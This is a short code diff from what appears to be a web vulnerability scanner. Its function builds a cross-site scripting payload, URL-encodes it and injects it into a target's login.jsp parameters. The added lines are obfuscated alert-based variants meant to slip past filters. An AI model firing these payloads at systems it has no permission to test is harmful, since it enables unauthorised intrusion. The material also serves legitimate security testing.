@@ -183,7 +183,11 @@ function fnDoCheckUrl(szUrl,fnCbk1)
 	if(url)
 		url = url.replace(/\/[^\/]*$/gmi, "/");
 	// encodeURIComponent
-	s = 'null"}alert(1);if(1){//';
+	// s = 'null"}alert(1);if(1){//';
+	/*
+	top[8680439..toString`30`]`7`;
+	*/
+	s = '"}alert`12`;if(1){//';// new Function`al\ert\`6\``
 	var sxPay = encodeURIComponent(s);//("null\";</" + g_ScrIpt + ">" + s);
 	
 	url = aH + url + "/login.jsp?samelogin=" + sxPay + "&style=" + sxPay;
